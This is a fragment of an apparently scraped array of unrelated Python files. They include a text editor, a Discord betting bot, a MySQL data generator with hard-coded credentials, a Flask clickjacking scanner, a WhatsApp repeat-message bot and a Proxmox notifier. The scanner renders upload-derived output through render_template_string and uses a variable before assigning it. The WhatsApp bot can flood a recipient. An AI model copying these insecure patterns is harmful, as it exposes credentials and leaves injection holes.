,50.0\r\n1,438.0,1612535413240,101.0,1",
    "from tkinter import *\nimport tkinter.filedialog\n\n\nclass TextEditor:\n\n    @staticmethod\n    def quit_app(event=None):\n        root.quit()\n\n    def open_file(self, event=None):\n\n        txt_file = tkinter.filedialog.askopenfilename(parent=root, initialdir=\"./examples\")\n\n        if txt_file:\n\n            self.text_area.delete(1.0, END)\n\n            with open(txt_file) as _file:\n\n                self.text_area.insert(1.0, _file.read())\n\n                root.update_idletasks()\n\n    def save_file(self, event=None):\n        file = tkinter.filedialog.asksaveasfile(mode='w')\n\n        if file != None:\n            data = self.text_area.get('1.0', END + '-1c')\n\n            file.write(data)\n            file.close()\n\n    def __init__(self, root):\n        self.text_to_write = \"\"\n\n        root.title(\"TextEditor\")\n\n        root.geometry(\"600x550\")\n\n        frame = Frame(root, width=600, height=550)\n\n        scrollbar = Scrollbar(frame)\n\n        self.text_area = Text(frame , width=600, height=550, yscrollcommand=scrollbar.set, padx = 10, pady=10)\n\n        scrollbar.config(command=self.text_area.yview)\n\n        scrollbar.pack(side=\"right\", fill=\"y\")\n\n        self.text_area.pack(side=\"left\", fill=\"both\", expand=True)\n\n        frame.pack()\n\n        the_menu = Menu(root)\n\n        file_menu = Menu(the_menu, tearoff=0)\n        file_menu.add_command(label=\"Open\", command=self.open_file)\n        file_menu.add_command(label=\"Save\", command=self.save_file)\n\n        file_menu.add_separator()\n        file_menu.add_command(label=\"Quit\", command=self.quit_app)\n\n        the_menu.add_cascade(label=\"File\", menu=file_menu)\n        root.config(menu=the_menu)\n\n\nroot = Tk()\ntext_editor = TextEditor(root)\nroot.mainloop()",
    "\"\"\"\nEntrypoint for running the agent in GKE.\nIf the agent adheres to PMAT standard (subclasses DeployableAgent), \nsimply add the agent to the `RunnableAgent` enum and then `RUNNABLE_AGENTS` dict.\n\nCan also be executed locally, simply by running `python predictionprophet_deployment/run_agent.py <agent> <market_type>`.\n\"\"\"\n\nfrom enum import Enum\n\nimport typer\nfrom prediction_market_agent_tooling.markets.markets import MarketType\n\nfrom predictionprophet_deployment.agents.prophet_agent.deploy import (\n    DeployableOlasEmbeddingOAAgent,\n    DeployablePredictionProphetGPT3Agent,\n    DeployablePredictionProphetGPT4TurboFinalAgent,\n    DeployablePredictionProphetGPT4TurboPreviewAgent,\n)\n\n\nclass RunnableAgent(str, Enum):\n    prophet_gpt3 = \"prophet_gpt3\"\n    prophet_gpt4 = \"prophet_gpt4\"\n    prophet_gpt4_final = \"prophet_gpt4_final\"\n    olas_embedding_oa = \"olas_embedding_oa\"\n\n\nRUNNABLE_AGENTS = {\n    RunnableAgent.prophet_gpt3: DeployablePredictionProphetGPT3Agent,\n    RunnableAgent.prophet_gpt4: DeployablePredictionProphetGPT4TurboPreviewAgent,\n    RunnableAgent.prophet_gpt4_final: DeployablePredictionProphetGPT4TurboFinalAgent,\n    RunnableAgent.olas_embedding_oa: DeployableOlasEmbeddingOAAgent,\n}\n\n\ndef main(agent: RunnableAgent, market_type: MarketType) -> None:\n    RUNNABLE_AGENTS[agent]().run(market_type)\n\n\nif __name__ == \"__main__\":\n    typer.run(main)\n",
    "import settings\nimport discord \nfrom discord.ext import commands\nimport random\nimport time\n\nlogger = settings.logging.getLogger(\"bot\")\n\n#\u00a0Each member of the server is represented as a \"User\"\nclass User():\n    def __init__ (self, id: int, name: str, balance: int):\n        self.name = name # User Name\n        self.wallet = balance # User balance\n        self.id = id # User id (used to match Users to members)\n\n        # Storing user's last bet parameters to allow multiple user's bets to occur simultaneously\n        self.lastBet = 0 # Stores the last bet made by the user\n        self.lastOdds = 0 # Stores the odds of the last bet made by the user\n\n    def deposit(self, amount: int): # Function to deposit money to wallet\n        self.wallet += amount\n\n    def spend(self, amount: int): # Function to spend money from wallet\n        self.wallet -= amount\n\n    # Utilities\n    def set_balance(self, amount: int): # Function to set wallet balance\n        self.wallet = amount\n\n    def win(self): # Function to payout bet wins\n        self.deposit(self.lastBet*self.lastOdds)\n\n    def invalid(self): # Function to return money after an invalid bet or error\n        self.deposit(self.lastBet)\n    \n# Create dictionary to store users\nusers = dict() # TODO This should be made persistent by storing in another file\n\ndef run(): # Main bot code\n    intents = discord.Intents.default() # Set initial intents\n    intents.message_content = True # Add intent to read messages\n    intents.members = True # Add intent to view server members\n\n    bot = commands.Bot(command_prefix = \"!\", intents = intents)\n\n    @bot.event\n    async def on_ready(): # Runs when bot connects\n        logger.info(f\"User: {bot.user} (ID: {bot.user.id})\") # Add bot connection info to logger\n        for guild in bot.guilds: #\u00a0For all servers the bot is in,\n            for member in guild.members: # For every member in the server,\n                # TODO check if user account already exists before creating\n                users[member.id] = User(member.id, member.name, 100) # Initialise their User class\n                print(\"Account created for \" + member.name + \", Balance : \" + str(users[member.id].wallet)) # TODO remove in final\n                logger.info(\"Account created for \" + member.name + \", Balance : \" + str(users[member.id].wallet)) # Add User class creation info to logger\n\n    @bot.group()\n    async def bet(ctx, amount : int): #\u00a0Action Group for betting\n        if ctx.invoked_subcommand is None: # If an invalid betting game is entered, send error\n            await ctx.send(f\"Invalid bet : {ctx.subcommand_passed}\")\n            users[ctx.author.id].invalid()\n        else: # Otherwise\n            users[ctx.author.id].spend(amount) # Withdraw the amount of the bet from the user's wallet immediately\n            users[ctx.author.id].lastBet = amount # Set the last bet variable to the amount bet\n\n    @bot.group()\n    async def wallet(ctx): #\u00a0Action Group for wallet\n        if ctx.invoked_subcommand is None: # If an invalid wallet command is entered, send error\n            await ctx.send(f\"Invalid command : {ctx.subcommand_passed}\")\n\n    @bot.command(\n            help = \"Tests if bot is live\",\n            description = \"Replies with \\\"Pong\\\"\",\n            brief = \"Replies with \\\"Pong\\\"\"\n    )\n    async def ping(ctx): # Ping command for bot\n        await ctx.send(\"Pong\")\n\n    @bot.command(\n            help = \"Repeats what you say\",\n            description = \"Replies to you with your message\",\n            brief = \"Repeats what you say\"\n    )\n    async def say(ctx, *message): # Message repitition command for bot\n        if(len(message) == 0):\n            await ctx.send(\"Say what?\")\n        else:\n            await ctx.send(\" \".join(message))\n\n    @wallet.command(\n            help = \"Wipes debt\",\n            description = \"Sets the balance of the specified user to 100\",\n            brief = \"Utility function for resetting balance\"\n    )\n    async def wipe_debt(ctx, member : discord.Member): # Sets the balance of the specified user to 100 \n        users[member.id].set_balance(100)\n        await ctx.send(\"Wiped \" + member.name + \"'s debt!\")\n\n    @wallet.command(\n            help = \"Displays someone's balance\",\n            description = \"Displays the balance of the specified user\",\n            brief = \"Display another user's balance\"\n    )\n    async def pocket_watch(ctx, member : discord.Member): # Displays the balance of the specified user\n        await ctx.send(member.name + \"'s balance is : \" + str(users[member.id].wallet))\n\n    @wallet.command(\n            help = \"Displays your balance\",\n            description = \"Displays the balance of the user who requests the command\",\n            brief = \"Display user's balance\"\n    )\n    async def open(ctx): # Displays the balance of the user requesting the command\n        await ctx.send(\"Your balance is : \" + str(users[ctx.author.id].wallet))\n\n    @wallet.command(\n            help = \"Utility balance decrease\",\n            descripti",
    "import pymysql\r\nimport random\r\nimport string\r\nimport time\r\n\r\ndef generate_random_code():\r\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))\r\n\r\ndef generate_data():\r\n    supplier_codes = {\r\n        \"\u534e\u6668\u79d1\u6280\": \"7iE2w9vF\",\r\n    }\r\n    suppliers = ['\u534e\u6668\u79d1\u6280']\r\n    products = {\r\n        '\u534e\u6668\u79d1\u6280': ['CHIP-908', 'CHIP-X3090', 'CHIP-4090', 'CHIP-P60']\r\n    }\r\n    product_categories = ['\u7535\u5b50\u4ea7\u54c1', '\u673a\u68b0\u8bbe\u5907', '\u5316\u5de5\u6750\u6599']\r\n    product_specifications = ['\u89c4\u683cA', '\u89c4\u683cB', '\u89c4\u683cC', '\u89c4\u683cD']\r\n    warehouse_codes = ['WH001', 'WH002', 'WH003']\r\n\r\n    # \u968f\u673a\u751f\u6210\r\n    product_category = random.choice(product_categories)\r\n    product_specification = random.choice(product_specifications)\r\n    supplier_name = random.choice(suppliers)\r\n    product_code = random.choice(products[supplier_name])\r\n    supplier_code = supplier_codes[supplier_name]\r\n    warehouse_code = random.choice(warehouse_codes)\r\n    # \u751f\u62101000\u523050000\u4e4b\u95f4\u4ee5\u5343\u4f4d\u5355\u4f4d\u7684\u6574\u6570\r\n    plan_quantity = round(random.randint(1, 50) * 1000)\r\n\r\n\r\n    # \u751f\u6210real_production_quantity \u503c\r\n    if random.random() < 0.1:\r\n        real_production_quantity = plan_quantity - random.randint(1, 100)\r\n    else:\r\n        real_production_quantity = plan_quantity\r\n\r\n    min_inventory = 500\r\n    max_inventory = 500000\r\n    unit = '\u4e2a'\r\n\r\n    # \u8fde\u63a5\u5230MySQL\u670d\u52a1\u5668\r\n    connection = pymysql.connect(host='10.30.5.3',\r\n                                 port=3306,\r\n                                 user='dcsUser',\r\n                                 password='dcs@123',\r\n                                 database='dcs')\r\n    cursor = connection.cursor()\r\n\r\n    # \u83b7\u53d6\u5f53\u524d\u4ea7\u54c1\u7684\u5e93\u5b58\r\n    cursor.execute(\"SELECT inventorv_quantity FROM repertory WHERE product_code = %s ORDER BY id DESC LIMIT 1\", (product_code,))\r\n    current_inventory = cursor.fetchone()\r\n    current_inventory = current_inventory[0] if current_inventory else 0\r\n\r\n    # \u5224\u65ad\u5e93\u5b58\u662f\u5426\u8d85\u8fc7\u6700\u5927\u5e93\u5b58\r\n    if current_inventory + real_production_quantity > max_inventory:\r\n        # \u5982\u679c\u8d85\u8fc7\u6700\u5927\u5e93\u5b58\uff0c\u5219\u51fa\u5e93\u8d85\u8fc7\u6700\u5927\u5e93\u5b58\u7684\u6240\u6709\u6570\u91cf + \u6700\u5927\u5e93\u5b58\u7684\u4e00\u534a\r\n        excess_quantity = (current_inventory + real_production_quantity) - max_inventory\r\n        outgoing_quantity = excess_quantity + max_inventory // 2\r\n        updated_inventory = current_inventory - outgoing_quantity\r\n    else:\r\n    # \u5982\u679c\u6ca1\u6709\u8d85\u8fc7\u6700\u5927\u5e93\u5b58\uff0c\u5219\u51fa\u5e93\u6570\u91cf\u4e3a1000\u523050000\u4e4b\u95f4\u7684\u6574\u6570\uff0c\u4f46\u4e0d\u80fd\u5927\u4e8e\u5269\u4f59\u5e93\u5b58\r\n        outgoing_quantity = min(random.randint(1000, 50000), current_inventory)\r\n        updated_inventory = current_inventory - outgoing_quantity\r\n\r\n    # \u63d2\u5165\u6570\u636e\r\n    sql = \"INSERT INTO repertory (supplier_name, supplier_code, product_code, plan_quantity, real_production_quantity, inventorv_quantity, product_category, product_specification, min_inventory, max_inventory, warehouse_code, unit, incoming_quantity, outgoing_quantity) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)\"\r\n    val = (supplier_name, supplier_code, product_code, plan_quantity, real_production_quantity, updated_inventory, product_category, product_specification, min_inventory, max_inventory, warehouse_code, unit, real_production_quantity, outgoing_quantity)\r\n    cursor.execute(sql, val)\r\n\r\n    # \u5173\u95ed\u8fde\u63a5\r\n    connection.commit()\r\n    connection.close()\r\n\r\nnext_run = 1\r\n\r\ndef job():\r\n    global next_run \r\n    generate_data()\r\n    next_run = random.randint(1, 20)  # 1 \u5230 20 \u4e4b\u95f4\u7684\u968f\u673a\u6570\r\n    print(f\"\u4e0b\u6b21\u6267\u884c\u5c06\u5728 {next_run} \u5206\u949f\u540e\")\r\n\r\n# \u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1\r\nwhile True:\r\n    job()\r\n    time.sleep(next_run * 60)\r\n",
    "from flask import Flask, request, render_template_string, redirect, url_for\nimport argparse\nimport urllib\nfrom urllib.request import Request, urlopen\nfrom urllib.parse import urlparse\nimport os\nimport re\nimport requests\n\napp = Flask(__name__)\n\nHTML = \"\"\"\n<!doctype html>\n<html>\n<head>\n    <title>Clickjacking Test Tool</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/style.css\">\n</head>\n<body>\n    <h2>Upload File with URLs to Check for Clickjacking</h2>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n</body>\n</html>\n\"\"\"\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        file = request.files['file']\n        if file:\n            content = file.read().decode('utf-8')\n            results = check_clickjacking(content)\n            return render_template_string(results)\n    return HTML\n\ndef check_clickjacking(content):\n    hdr = {'User-Agent': 'Mozilla/5.0'}\n    results = \"\"\n    for target in content.splitlines():\n        t = target.strip()\n        if not t.startswith(('http://', 'https://')):\n            t = 'https://' + t\n        try:\n            req = Request(t, headers=hdr)\n            data = urlopen(req, timeout=10)\n            headers = data.info()\n            response= requests.get(t)\n            vuln= False\n\n            frame_buster = re.search(r'<script>(.*)if\\(top \\!= self\\)\\s*{', response.text, re.DOTALL | re.IGNORECASE)\n            pattern_onbeforeunload = r'<script>\\s*window\\.onbeforeunload[^<]*</script>.*?<iframe src=\"([^\"]+)\"'\n            match_pattern_onbeforeunload = re.search(pattern_onbeforeunload, response.text, re.IGNORECASE | re.DOTALL)\n            pattern_location= r'<script>\\s*var\\s+location\\s*=\\s*[^;]+;\\s*</script>.*?<iframe src=\"([^\"]+)\"'\n            match_pattern_location= re.search(pattern_location, response.text, re.IGNORECASE | re.DOTALL)\n            pattern_location_1=r'<script>\\s*window\\.defineSetter\\(\"location\",\\s*function\\(\\)\\s*{}\\);\\s*</script>.*?<iframe src=\"([^\"]+)\">'\n            match_pattern_location_1= re.search(pattern_location, response.text, re.IGNORECASE | re.DOTALL)\n            x_frame_options = response.headers.get('X-Frame-Options', '')\n            content_security_policy = response.headers.get('Content-Security-Policy', '')\n            \n            desired_domain= t\n\n            if \"Referer\" in req.headers:\n                host_url = req.host_url\n                referer_url = req.headers[\"Referer\"]\n                if not referer_url.startswith(host_url):\n                   vuln = True\n            if not ((\"X-Frame-Options\") or (\"x-frame-options\") or (\"Content-Security-Policy\") or (\"content-security-policy\")  or (\"frame-ancestors\")) in headers:\n                vuln = True\n\n            if match_pattern_onbeforeunload:\n               iframe_src = match_pattern_onbeforeunload.group(1)  # L\u1ea5y gi\u00e1 tr\u1ecb c\u1ee7a src\n               if iframe_src.startswith(desired_domain):\n                print(\"The iframe src matches the desired domain and is linked to the onbeforeunload script.\")\n               else:\n                print(\"The iframe src does not match the desired domain but is linked to the onbeforeunload script.\")\n                vuln= True\n            \n            if match_pattern_location:\n               iframe_src = match_pattern_location.group(1)  # L\u1ea5y gi\u00e1 tr\u1ecb c\u1ee7a src\n               if iframe_src.startswith(desired_domain):\n                print(\"The iframe src matches the desired domain and is linked to the location script.\")\n               else:\n                print(\"The iframe src does not match the desired domain but is linked to the location script.\")\n                vuln= True\n\n            if match_pattern_location_1:\n               iframe_src = match_pattern_location_1.group(1)  # L\u1ea5y gi\u00e1 tr\u1ecb c\u1ee7a src\n               if iframe_src.startswith(desired_domain):\n                print(\"The iframe src matches the desired domain and is linked to the location 1 script.\")\n               else:\n                print(\"The iframe src does not match the desired domain but is linked to the location 1 script.\")\n                vuln= True    \n \n            if content_security_policy:\n               csp_policies = content_security_policy.split(';')\n               frame_ancestors_content = frame_ancestors.group(1)\n               frame_ancestors = re.search(r'frame-ancestors\\s(.*?);', content_security_policy)\n               if 'frame-ancestors' in content_security_policy:\n                if frame_ancestors_content.lower() == '\\'self *\\'':\n                    print(('red_msg', f'[!] The site may be vulnerable to clickjacking. Frame-ancestors content: {frame_ancestors_content}'))\n                    vuln= True\n\n            if x_frame_options:\n                if x_frame_options.lower() == 'allow-from *':\n                   print(('red_msg', f'[!] The site may be vulnerable to clickjacking. X-Frame-Options content: {x_frame_options}'))\n   ",
    "import socket\nimport tkinter as tk\nfrom datetime import datetime\nfrom time import sleep\nimport time\nimport json\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.support.ui import WebDriverWait\n\nnow = datetime.now()\n\n# driver = webdriver.Chrome(executable_path=\"./chromedriver\")\n\n#Keep the current chrome session\noptions = webdriver.ChromeOptions()\n#options.add_argument('--user-data-dir=./User_Data')\noptions.add_argument(\"--no-sandbox\");\noptions.add_argument(\"--disable-dev-shm-usage\");\n\nmaster = tk.Tk()\nmaster.title(\"Whatsapp Bot\")\nwidth = 500\nheight = 700\ncanvas1 = tk.Canvas(master, width=width, height=height, relief='raised', bg='white')\ncanvas1.pack()\n# load the .gif image file\n# canvas1.create_line(15, 25, 200, 25)\ncanvas1.create_line(width / 2, 0, width / 2, height, dash=(4, 2))\ncanvas1.create_line(800, height / 2, 0, height / 2, dash=(4, 2))\n\ncx = canvas1.canvasx(width / 2)\ncy = canvas1.canvasy(height / 2)\ncid = canvas1.find_closest(cx, cy)[0]\ncanvas1.itemconfigure(cid, fill=\"blue\")\n\n# canvas1.create_line(55, 85, 155, 85, 105, 180, 55, 85)\n# canvas1.create_text(400, 10, fill=\"black\", font=\"Times 20 italic bold\",\n#                  text=\"Whatsapp Bot\")\ngif1 = tk.PhotoImage(file='images/GZd3Pv.png')\n# gif2 = tk.PhotoImage(file='images/9022c3da331305796ded3dda4c619df0.png')\n\n# put gif image on canvas\n# pic's upper left corner (NW) on the canvas is at x=50 y=10\n#canvas1.create_image(400, 350, image=gif2)\n\n# put gif image on canvas\n# pic's upper left corner (NW) on the canvas is at x=50 y=10\ncanvas1.create_image(width / 2, height / 2, image=gif1)\n\n\n# label1 = tk.Label(master, text='Whatsapp Bot')\n# label1.config(font=('helvetica', 14))\n# canvas1.create_window(200, 25, window=label1)\ndef blueSelection(event=None):\n    l1 = tk.Label(master,\n                  text=\"Enter the Message \", bg=\"blue\")\n    l2 = tk.Label(master,\n                  text=\"How many message do you want to send ?\", bg=\"blue\")\n    l3 = tk.Label(master,\n                  text=\"Enter the Phone Number \", bg=\"blue\")\n\n    canvas1.create_window(100, 250, window=l1)\n    canvas1.create_window(150, 290, window=l2)\n    canvas1.create_window(100, 330, window=l3)\n\n    e1 = tk.Entry(master)\n\n    e2 = tk.Entry(master)\n\n    e3 = tk.Entry(master)\n\n    canvas1.create_window(400, 250, window=e1)\n    canvas1.create_window(400, 290, window=e2)\n    canvas1.create_window(400, 330, window=e3)\n\n    def Driver():\n        message_text = e1.get()  # message you want to send\n        no_of_message = e2.get()\n        if type(no_of_message) == int:\n            print(\"The number is integer\" + str(no_of_message))\n        else:\n            try:\n                no_of_message = int(no_of_message)\n            except:\n                m1 = tk.Label(master,\n                              text=\"ERROR : Please enter digits for No of Messages.\", fg=\"red\", bg=\"black\")\n\n                canvas1.create_window(250, 170, window=m1)\n                m1.after(5000, m1.destroy)\n\n        if len(message_text) == 0 or len(str(no_of_message)) == 0:\n            m1 = tk.Label(master,\n                          text=\"ERROR : Please fill the blanks.\", fg=\"red\", bg=\"black\")\n\n            canvas1.create_window(250, 140, window=m1)\n            m1.after(5000, m1.destroy)\n\n        phone_number = int(e3.get())\n\n        if len(str(phone_number)) < 9:\n            m1 = tk.Label(master,\n                          text=\"ERROR : Please enter minimum 9 digits for Phone Number.\", fg=\"red\", bg=\"black\")\n\n            canvas1.create_window(250, 200, window=m1)\n            m1.after(5000, m1.destroy)\n        else:\n            phone_number = [phone_number]\n            driver = webdriver.Chrome(executable_path=\"./chromedriver\", options=options)\n            driver.get(\"http://web.whatsapp.com\")\n            sleep(15)  # wait time to scan the code in second\n\n            def element_presence(driver, by, xpath, time):\n                element_present = EC.presence_of_element_located((By.XPATH, xpath))\n                WebDriverWait(driver, time).until(element_present)\n\n            def is_connected():\n                try:\n                    # connect to the host -- tells us if the host is actually\n                    # reachable\n                    socket.create_connection((\"www.google.com\", 80))\n                    return True\n                except:\n                    is_connected()\n\n            def send_whatsapp_msg(driver, phone_no, text, no):\n                sleep(2)\n                driver.get(\"https://web.whatsapp.com/send?phone={}&source=&data=#\".format(phone_no))\n\n                try:\n                    element_presence(driver, By.XPATH, '//*[@id=\"main\"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div', 30)\n                    txt_box = driver.find_element(By.XPATH, '//*[@id=\"main\"]/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div')\n                    for x in range(no):\n                        print(x)\n",
    "from mcdreforged.api.all import *\n\nPLUGIN_METADATA = {\n    'id': 'leader',\n    'version': '1.0.0',\n    'name': 'Leader-Plugin',\n    'description': 'give a player marker',\n    'author': 'WalkerTian',\n    'link': 'https://github.com/Walkersifolia/Leader'\n}\n\ndef is_admin(server: ServerInterface, player: str) -> bool:\n    return server.get_permission_level(player) >= 3\n\ndef on_user_info(server: ServerInterface, info: Info):\n    if info.is_player:\n        if info.content == '!!leader':\n            server.execute('effect give {} minecraft:glowing 1000000'.format(info.player))\n        elif info.content == '!!unleader':\n            server.execute('effect clear {} minecraft:glowing'.format(info.player))\n        elif info.content == '!!leader all':\n            if is_admin(server, info.player):\n                server.execute('effect give @a minecraft:glowing 1000000')\n            else:\n                server.reply(info, '\u4f60\u6ca1\u6709\u6743\u9650\u6267\u884c\u8fd9\u4e2a\u6307\u4ee4')\n        elif info.content.startswith('!!unleader all'):\n            if is_admin(server, info.player):\n                server.execute('effect clear @a minecraft:glowing')\n            else:\n                server.reply(info, '\u4f60\u6ca1\u6709\u6743\u9650\u6267\u884c\u8fd9\u4e2a\u6307\u4ee4')\n\ndef on_load(server: ServerInterface, old_module):\n    server.register_help_message('!!leader', '\u9ad8\u4eae\u81ea\u5df1')\n    server.register_help_message('!!unleader', '\u53d6\u6d88\u9ad8\u4eae')\n    server.register_help_message('!!leader all', '\u8ba9\u6240\u6709\u73a9\u5bb6\u53d1\u5149\uff08\u4ec5\u7ba1\u7406\u5458\u53ef\u7528\uff09')\n    server.register_help_message('!!unleader all', '\u53d6\u6d88\u8ba9\u6240\u6709\u73a9\u5bb6\u53d1\u5149\uff08\u4ec5\u7ba1\u7406\u5458\u53ef\u7528\uff09')\n    server.register_event_listener('minecraft.console.info', on_user_info)",
    "\"\"\"\nContains core of panalyze: Measurement, Segment\n\n\"\"\"\n\nfrom __future__ import annotations\nfrom typing import Callable, Union, Optional\nimport numpy as np\nimport numpy.typing as npt\nfrom scipy.interpolate import CubicSpline\nimport pandas as pd\nimport matplotlib.pyplot as plt\nfrom datetime import datetime\nfrom io import StringIO\n\n\nvector = matrix = npt.NDArray[np.float_]  # Annotation shorthand\n\n# Sapphire reference heat capacity data\nSAPPHIRE_CP_DATA = np.loadtxt(\"sapphire_cp.csv\", dtype=np.float32,\n                              delimiter=\",\", skiprows=1, usecols=(0, 2))\nSAPPHIRE_CP = CubicSpline(SAPPHIRE_CP_DATA[:, 0],\n                          SAPPHIRE_CP_DATA[:, 1])\n\nclass Measurement():\n    \"\"\"Class to represent a DSC measurement.\n\n    Attributes\n    ----------\n    sample : str\n        Sample name.\n    mass : float\n        Sample mass in mg.\n    segments : list[Segment]\n        List with measurement segments.\n    operator : str\n        Name of the operator.\n    date : datetime.date\n        Run date.\n    instrument : str\n        Instrument name.\n    fn : str\n        Filename.\n\n    Methods\n    -------\n    read_csv(fn)\n        Reads TRIOS csv file and updates attributes.\n    plot()\n        Plots T vs. \u0394H for all segments.\n\n    \"\"\"\n\n    def __init__(self, fn: str):\n        \"\"\"Initialize Measurement instance.\n\n        Parameters\n        ----------\n        fn : str\n            Filename.\n\n        Note: For now only CSV files exported from TRIOS are supported.\n\n        \"\"\"\n        self.read_csv(fn)\n\n    def read_csv(self, fn: str):\n        \"\"\"Read file.\n\n        Parameters\n        ----------\n        fn : str\n            Filename.\n\n        Note\n        ----\n        Currently only supports CSV files exported from TRIOS. The datafile should\n        include the parameters and the steps. The following columns (in order) need to\n        be exported: time [s], temperature [\u00b0C], heat flow [mW], norm. heat flow [W/g].\n\n        \"\"\"\n        with open(fn, 'r', encoding='utf-8-sig') as f:\n            head, *segments = f.read().split(\"[step]\\n\")\n            for info in head.strip().split(\"\\n\"):\n                keyw, *val = info.lower().split(\",\")\n                if keyw == \"filename\":\n                    self.fn = val[0] + \".csv\"\n                elif keyw == \"operator\":\n                    self.operator = val[0]\n                elif keyw == \"rundate\":\n                    self.date = datetime.strptime(val[0], \"%m/%d/%Y\")\n                elif keyw == \"sample name\":\n                    self.sample = val[0]\n                elif keyw == \"sample mass\":\n                    self.mass = float(val[0].split(\" \")[0])  # mg\n                elif keyw == \"instrument name\":\n                    self.instrument = val[0]\n            self.segments = []\n            for segment in segments:\n                name = segment.split(\"\\n\")[0]\n                data = pd.read_csv(StringIO(segment), sep=\",\", header=2)\n                data.columns = [\"Time [s]\",\n                                \"Temperature [\u00b0C]\",\n                                \"Heat flow [mW]\",\n                                \"Norm. heat flow [W/g]\"]\n                self.segments.append(Segment(data, name, self.mass))\n\n    def plot(self, ax: Optional[plt.Axes] = None) -> plt.Axes:\n        \"\"\"Plot T versus \u0394H for all segments.\n\n        Parameters\n        ----------\n        ax : plt.Axes (optional)\n            An axes where to plot.\n\n        Returns\n        -------\n        ax : plt.Axes\n            Axes handle.\n\n        Note\n        ----\n        Uses the pandas plot function, which also means that all the pandas plot options\n        are available. More information can be found here:\n\n        https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.plot.html\n\n        \"\"\"\n        if ax == None:\n            fig = plt.figure()\n            ax = fig.add_axes([0.15, 0.18, 0.7, 0.72])\n        for segment in self.segments:\n            segment.plot(x=\"Temperature [\u00b0C]\", y=\"Heat flow [mW]\", ax=ax, legend=None)\n        ax.set_title(self.sample)\n        return ax\n\n    def __str__(self) -> str:\n        \"\"\"Return string for printing.\"\"\"\n        meta = (f\"\\n{self.sample}\\n\" +\n                \"------------------------------------\\n\" +\n                f\"Mass:               {self.mass} mg\\n\" +\n                f\"Date:               {self.date.date()}\\n\" +\n                f\"Operator:           {self.operator}\\n\" +\n                f\"Instrument:         {self.instrument}\\n\" +\n                f\"Filename:           {self.fn}\\n\" +\n                f\"Number of segments: {len(self.segments):<2}\\n\\n\")\n        segm = (\"Segments\\n\"\n                \"-----------------------------------\\n\")\n        for i, segment in enumerate(self.segments):\n            segm += f\"{i:<2} {segment.name}\\n\"\n        return (meta + segm)\n\n    def __getitem__(self, index) -> Segment:\n        \"\"\"Return segment using index.\"\"\"\n        return self.segments[index]\n\n\nclass Segment():\n    \"\"\"Class to represent a DSC measurement segment.\n\n    Attrib",
    "\nimport os\nimport logging\nimport aiohttp\nimport asyncio\nimport proxmoxer\nimport sys\nimport urllib3\nimport time\nimport json\n\n# Disable SSL warnings\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# Ntfy server details\nNTFY_SERVER_URL = os.getenv('NTFY_SERVER_URL', \"https://ntfy.sh/CA9FFE70-B1B0-4C1C-9256-0BBD8FAE2CE6\")\nNTFY_TOKEN = os.getenv('NTFY_TOKEN', None)\nNTFY_USER = os.getenv('NTFY_USER', None)\nNTFY_PASS = os.getenv('NTFY_PASS', None)\n\n# Create a cache class\nclass Cache(object):\n    \"\"\"\n    Cache Requests\n    \"\"\"\n    color_id = 0\n    clr = \"\\033[0m\"\n    colors = (\n        \"\\033[0m\",      # RST\n        \"\\033[31m\",     # RED\n        \"\\033[92m\",     # GREEN\n        \"\\033[33m\",     # YELLOW\n        \"\\033[34m\",     # BLUE\n        \"\\033[35m\",     # MAGENTA\n        \"\\033[36m\",     # CYAN\n        \"\\033[37m\",     # WHITE\n        \"\\033[95m\",     # VIVID\n    )\n\n    def __init__(self):\n        Cache.color_id += 1\n        if Cache.color_id not in range(1, len(Cache.colors)):\n            Cache.color_id = 1\n\n        self.color_id = Cache.color_id\n\n    def color(self):\n        return self.colors[self.color_id]\n\n    def clr(self):\n        return self.colors[0]\n\n\ntask_handlers = {}\nqueue = asyncio.Queue()\nprocessed_tasks = set()\n\nasync def send_notification(title, tags, message):\n    logging.info(f\"Sending notification: Title={title}, Tags={tags}\")\n    async with aiohttp.ClientSession() as session:\n        headers = {\n            \"Title\": title,\n            \"Tags\": tags,\n            \"Markdown\": \"yes\"\n        }\n\n        if NTFY_TOKEN:\n            headers['Authorization'] = f'Bearer {NTFY_TOKEN}'\n        elif NTFY_USER and NTFY_PASS:\n            auth = aiohttp.BasicAuth(NTFY_USER, NTFY_PASS)\n        else:\n            auth = None\n        \n        try:\n            async with session.post(NTFY_SERVER_URL, data=message, headers=headers, auth=auth) as response:\n                logging.debug(f\"POST Response: Status={response.status}, Text={await response.text()}\")\n                response.raise_for_status()  # Raise an exception for 4xx or 5xx status codes\n                logging.info(f\"Notification sent successfully: Title={title}, Tags={tags}\")\n        except aiohttp.ClientResponseError as e:\n            logging.error(f\"Error sending notification: {e}\")\n            logging.debug(f\"Response Headers: {e.headers}\")\n            logging.debug(f\"Response Text: {e.message}\")\n        except Exception as e:\n            logging.error(f\"Error sending notification: {e}\")\n\n\nasync def get_proxmox_tasks(proxmox, since):\n    nodes = proxmox.nodes.get()\n    tasks = []\n    for node in nodes:\n        name = node['node']\n        node_tasks = proxmox.nodes(name).tasks.get(since=since, source=\"all\")\n        tasks.extend(node_tasks)\n    return tasks\n\n\nasync def get_task_status(proxmox, node, task_id):\n    status = proxmox.nodes(node).tasks(task_id).status.get()\n    logging.debug(f\"STATUS [{task_id}] {status}\")\n    return status\n\n\nasync def get_task_log(proxmox, node, task_id):\n    log = proxmox.nodes(node).tasks(task_id).log.get()\n    logging.debug(f\"LOG [{task_id}] {log}\")\n    return [log_entry['t'] for log_entry in log if log_entry['t']]\n\n\nasync def monitor_task(proxmox, task):\n    task_id = task['upid']\n    _, node, uuid, _ = task_id.split(\":\", maxsplit=3)\n    logging.info(f\"[{uuid}] Task found. Monitoring...\")\n    start_time = time.time()\n    timeout = 1800\n    while True:\n        task_status = await get_task_status(proxmox, node, task_id)\n        status = task_status.get('status', None)\n        exitstatus = 